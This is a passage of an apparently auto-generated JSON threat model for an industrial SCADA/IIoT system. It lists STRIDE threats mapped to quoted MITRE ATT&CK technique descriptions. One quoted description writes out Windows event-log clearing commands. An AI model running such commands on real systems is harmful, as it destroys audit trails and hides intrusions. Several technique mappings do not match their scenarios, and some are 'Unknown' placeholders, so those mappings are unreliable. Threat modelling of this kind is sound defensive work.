            "Threat Type": "Denial of Service",
            "Scenario": "An attacker compromises the cloud services and exhausts their computational resources, preventing data processing and analytics.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services lack resource usage monitoring and limits.",
                    "Role": "Cloud Provider",
                    "Condition": "During service configuration."
                },
                {
                    "Assumption": "An attacker gains access to manage cloud resources.",
                    "Role": "Attacker",
                    "Condition": "During account compromise."
                },
                {
                    "Assumption": "No automated alerts for excessive resource consumption.",
                    "Role": "Security Analyst",
                    "Condition": "Through poor monitoring practices."
                }
            ],
            "Potential Impact": "Inability to process and analyze real-time data, impacting decision-making and operational insights.",
            "MITRE ATT&CK Keywords": [
                "Cloud Resource Exhaustion",
                "Computational Denial",
                "Data Processing Disruption",
                "Analytics Impairment"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software vulnerability in the Control Center's HMI to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "HMI software contains unpatched vulnerabilities.",
                    "Role": "Software Vendor",
                    "Condition": "Due to delayed patches or updates."
                },
                {
                    "Assumption": "Insufficient segmentation between user and admin levels.",
                    "Role": "System Architect",
                    "Condition": "When designing access control measures."
                },
                {
                    "Assumption": "The attacker has already gained initial user-level access to the HMI.",
                    "Role": "Attacker",
                    "Condition": "Prior to privilege escalation."
                }
            ],
            "Potential Impact": "Full control over operational settings, allowing for malicious alterations and widespread operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Software Exploitation",
                "Admin Access",
                "Configuration Manipulation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a misconfigured gateway to escalate from user to superuser privileges, gaining control over data transmissions.",
            "Assumptions": [
                {
                    "Assumption": "Gateway user privileges are not adequately separated or controlled.",
                    "Role": "System Administrator",
                    "Condition": "During system setup."
                },
                {
                    "Assumption": "The attacker has identified and exploited a misconfiguration.",
                    "Role": "Attacker",
                    "Condition": "During system probing."
                },
                {
                    "Assumption": "No regular audits of system configurations are performed.",
                    "Role": "Security Analyst",
                    "Condition": "Due to inadequate auditing policies."
                }
            ],
            "Potential Impact": "Control over critical data paths, enabling data tampering and unauthorized data interception.",
            "MITRE ATT&CK Keywords": [
                "Configuration Misuse",
                "Superuser Escalation",
                "Data Path Control",
                "Unauthorized Access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits inadequate access controls on cloud services to gain higher privileges and access sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud access controls are weak or misconfigured.",
                    "Role": "Cloud Administrator",
                    "Condition": "During system configuration."
                },
                {
                    "Assumption": "Attacker has initial low-level access to cloud services.",
                    "Role": "Attacker",
                    "Condition": "Prior to privilege escalation."
                },
                {
                    "Assumption": "No principle of least privilege is enforced.",
                    "Role": "Security Policy Maker",
                    "Condition": "When defining access control policies."
                }
            ],
            "Potential Impact": "Comprehensive access to sensitive data, increasing the risk of data breaches and exploitation.",
            "MITRE ATT&CK Keywords": [
                "Access Control Bypass",
                "Cloud Privilege Escalation",
                "Sensitive Data Access",
                "Unauthorized Privilege"
            ],
            "mitre_technique": {
                "name": "Temporary Elevated Cloud Access",
                "description": "Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. \n\nJust-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.(Citation: Azure Just in Time Access 2023)\n\nAccount impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts.(Citation: Google Cloud Service Account Authentication Roles)(Citation: Hunters Domain Wide Delegation Google Workspace 2023)(Citation: Google Cloud Just in Time Access 2023)(Citation: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts.(Citation: Microsoft Impersonation and EWS in Exchange) \n\nMany cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.(Citation: AWS PassRole)(Citation: Google Cloud Service Account Authentication Roles)\n\nWhile users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.(Citation: Rhino Google Cloud Privilege Escalation)(Citation: Rhino Security Labs AWS Privilege Escalation)\n\n**Note:** this technique is distinct from [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.(Citation: CrowdStrike StellarParticle January 2022)",
                "id": "attack-pattern--6fa224c7-5091-4595-bf15-3fc9fe2f2c7c",
                "technique_id": "T1548.005"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "24",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker poses as a legitimate RTU to intercept control commands from the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can gain network access to the communication channels between RTUs and Control Center",
                    "Role": "Attacker",
                    "Condition": "Attacker physically or remotely accesses the network"
                },
                {
                    "Assumption": "The communication channels are not sufficiently authenticated or encrypted",
                    "Role": "System Administrator",
                    "Condition": "Weak or no encryption methods used for communication"
                }
            ],
            "Potential Impact": "Unauthorized control over industrial processes, leading to potential operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "control commands",
                "RTU"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a gateway to intercept data between the SCADA system and cloud services.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has network access to intercept and spoof gateway communications",
                    "Role": "Attacker",
                    "Condition": "Attacker accesses network points between SCADA and cloud services"
                },
                {
                    "Assumption": "Insufficient authentication mechanisms for devices participating in the IIoT network",
                    "Role": "System Administrator",
                    "Condition": "Legacy or weak authentication systems"
                }
            ],
            "Potential Impact": "Exposure of sensitive operational data and potential manipulation of data before it reaches cloud services.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "SCADA",
                "gateway",
                "cloud services"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerades as a legitimate field device (sensor or actuator) to inject false data into the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker gains physical or network access to the field device interface",
                    "Role": "Attacker",
                    "Condition": "Poor physical security or network segmentation"
                },
                {
                    "Assumption": "Field devices lack robust authentication with the RTU",
                    "Role": "System Administrator",
                    "Condition": "Outdated or weak security protocols between field devices and RTU"
                }
            ],
            "Potential Impact": "Introduction of incorrect data, potentially leading to incorrect control actions and process disruptions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "field device",
                "sensor",
                "data injection"
            ],
            "mitre_technique": {
                "name": "Indicator Blocking",
                "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1086) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. ",
                "id": "attack-pattern--6a5848a8-6201-4a2c-8a6a-ca5af8c6f3df",
                "technique_id": "T1054"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies control commands sent from the Control Center to RTUs.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the communication path between the Control Center and RTUs",
                    "Role": "Attacker",
                    "Condition": "Weak network security and inadequate monitoring"
                },
                {
                    "Assumption": "The data is not encrypted end-to-end",
                    "Role": "System Administrator",
                    "Condition": "Use of plaintext or weakly encrypted communication channels"
                }
            ],
            "Potential Impact": "Corruption of control commands resulting in operational failures or unsafe conditions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "control commands",
                "RTU",
                "wide area network"
            ],
            "mitre_technique": {
                "name": "Create or Modify System Process",
                "description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.(Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.(Citation: OSX Malware Detection)  ",
                "id": "attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5",
                "technique_id": "T1543"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters configuration settings of field devices via the network.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can communicate with field devices over the network",
                    "Role": "Attacker",
                    "Condition": "Network segmentation and access controls are weak"
                },
                {
                    "Assumption": "Field devices do not verify the authenticity of the configuration commands",
                    "Role": "System Administrator",
                    "Condition": "Insufficient authentication for configuration changes"
                }
            ],
            "Potential Impact": "Incorrect configuration leading to malfunctioning of field devices and potentially hazardous conditions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "configuration settings",
                "field devices",
                "network access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries with privileged network access may seek to modify network traffic in real time using adversary-in-the-middle (AiTM) attacks. (Citation: Gabriel Sanchez October 2017) This type of attack allows the adversary to intercept traffic to and/or from a particular device on the network. If a AiTM attack is established, then the adversary has the ability to block, log, modify, or inject traffic into the communication stream. There are several ways to accomplish this attack, but some of the most-common are Address Resolution Protocol (ARP) poisoning and the use of a proxy. (Citation: Bonnie Zhu, Anthony Joseph, Shankar Sastry 2011)  \n\nAn AiTM attack may allow an adversary to perform the following attacks:  \n[Block Reporting Message](https://attack.mitre.org/techniques/T0804), [Spoof Reporting Message](https://attack.mitre.org/techniques/T0856), [Modify Parameter](https://attack.mitre.org/techniques/T0836), [Unauthorized Command Message](https://attack.mitre.org/techniques/T0855)",
                "id": "attack-pattern--9a505987-ab05-4f46-a9a6-6441442eec3b",
                "technique_id": "T0830"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware of PLCs to introduce malicious functionality.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to the PLCs",
                    "Role": "Attacker",
                    "Condition": "Poor physical security and remote access controls"
                },
                {
                    "Assumption": "Firmware integrity checks are not enforced",
                    "Role": "System Administrator",
                    "Condition": "No or weak integrity checking mechanisms"
                }
            ],
            "Potential Impact": "Malicious code execution within critical operational systems, leading to failures and potential damage.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "PLCs",
                "malicious code"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies issuing a command to a field device, arguing they were not logged in.",
            "Assumptions": [
                {
                    "Assumption": "The system does not log command issuance with user-identifiable information",
                    "Role": "System Administrator",
                    "Condition": "Inadequate or no logging of command issuance and user actions"
                },
                {
                    "Assumption": "User sessions are not properly managed or controlled",
                    "Role": "System Administrator",
                    "Condition": "Weak session management practices"
                }
            ],
            "Potential Impact": "Blaming cannot be correctly attributed, leading to difficulties in auditing and accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "user commands",
                "logging",
                "field device"
            ],
            "mitre_technique": {
                "name": "SSH Authorized Keys",
                "description": "Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code>.(Citation: SSH Authorized Keys) Users may edit the system\u2019s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value \u201cyes\u201d to ensure public key and RSA authentication are enabled. The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.\n\nAdversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI\u2019s \u201cadd-metadata\u201d command an adversary may add SSH keys to a user account.(Citation: Google Cloud Add Metadata)(Citation: Google Cloud Privilege Escalation) Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.(Citation: Azure Update Virtual Machines) This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm) It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.\n\nWhere authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. \n\nSSH keys can also be added to accounts on network devices, such as with the `ip ssh pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) command.(Citation: cisco_ip_ssh_pubkey_ch_cmd)",
                "id": "attack-pattern--6b57dc31-b814-4a03-8706-28bc20d739c4",
                "technique_id": "T1098.004"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs malicious actions through the HMI interface and later denies the actions.",
            "Assumptions": [
                {
                    "Assumption": "System logs do not capture sufficient forensic data about user actions",
                    "Role": "System Administrator",
                    "Condition": "Insufficient or inadequately configured logging mechanisms"
                },
                {
                    "Assumption": "User accounts are shared or improperly managed",
                    "Role": "System Administrator",
                    "Condition": "Multiple users share accounts without individual identification"
                }
            ],
            "Potential Impact": "Difficulty in tracing malicious activities back to specific users, hindering investigation efforts.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "HMI",
                "forensic data",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee uploads incorrect manufacturing data to the MES but denies doing it.",
            "Assumptions": [
                {
                    "Assumption": "MES does not log detailed user actions including data uploads",
                    "Role": "System Administrator",
                    "Condition": "Logs are not sufficient to track specific actions to individuals"
                },
                {
                    "Assumption": "Users can access the MES with limited identity verification",
                    "Role": "System Administrator",
                    "Condition": "Weak identity and access management practices"
                }
            ],
            "Potential Impact": "Improper data integrity tracking, leading to challenges in correcting and tracing data errors.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "MES",
                "data upload",
                "logging"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive operational data intercepted during transmission from RTUs to the gateway.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted over insecure or insufficiently protected communication channels",
                    "Role": "System Administrator",
                    "Condition": "Weak encryption or unencrypted data transmission"
                },
                {
                    "Assumption": "Attacker has the capability to intercept network traffic",
                    "Role": "Attacker",
                    "Condition": "Network monitoring and intrusion capabilities"
                }
            ],
            "Potential Impact": "Exposure of sensitive data, possibly leading to competitive losses or exploitable vulnerabilities.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "RTU",
                "gateway",
                "network interception"
            ],
            "mitre_technique": {
                "name": "Port Monitors",
                "description": "A port monitor can be set through the  (Citation: AddMonitor) API call to set a DLL to be loaded at startup. (Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions. (Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. \n\nThe Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port\n\nAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.",
                "id": "attack-pattern--1f47e2fd-fa77-4f2f-88ee-e85df308f125",
                "technique_id": "T1013"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data stored in the cloud is accessed by unauthorized users.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage security is not sufficiently robust",
                    "Role": "Cloud Service Provider",
                    "Condition": "Weak access controls or poorly enforced security policies"
                },
                {
                    "Assumption": "Attacker has or gains credentials for cloud service access",
                    "Role": "Attacker",
                    "Condition": "Credential theft or weak user access management"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data leading to data breaches and information leakage.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud storage",
                "unauthorized access",
                "credentials"
            ],
            "mitre_technique": {
                "name": "Securityd Memory",
                "description": "An adversary with root access may gather credentials by reading `securityd`\u2019s memory. `securityd` is a service/daemon responsible for implementing security protocols such as encryption and authorization.(Citation: Apple Dev SecurityD) A privileged adversary may be able to scan through `securityd`'s memory to find the correct sequence of keys to decrypt the user\u2019s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)\n\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.(Citation: OS X Keychain)(Citation: External to DA, the OS X Way) Apple\u2019s `securityd` utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)",
                "id": "attack-pattern--1a80d097-54df-41d8-9d33-34e755ec5e72",
                "technique_id": "T1555.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts MQTT data streams and captures sensitive industrial data.",
            "Assumptions": [
                {
                    "Assumption": "MQTT communication is not properly encrypted",
                    "Role": "System Administrator",
                    "Condition": "Use of plaintext or weak encryption for MQTT data streams"
                },
                {
                    "Assumption": "Attacker can access the network over which MQTT data is transmitted",
                    "Role": "Attacker",
                    "Condition": "Network is vulnerable to interception"
                }
            ],
            "Potential Impact": "Sensitive data is compromised, potentially leading to operational and security risks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "MQTT",
                "data streams",
                "network interception"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A distributed denial of service (DDoS) attack on the Control Center disrupts communication with field devices.",
            "Assumptions": [
                {
                    "Assumption": "Control Center is accessible over the public internet",
                    "Role": "System Designer",
                    "Condition": "Insufficient network segmentation and protection"
                },
                {
                    "Assumption": "The system lacks adequate DDoS protection mechanisms",
                    "Role": "System Administrator",
                    "Condition": "No mitigation or detection solutions in place"
                }
            ],
            "Potential Impact": "Disruption in the ability to issue controls and monitor field devices, leading to potential operational downtime.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "Control Center",
                "communication disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
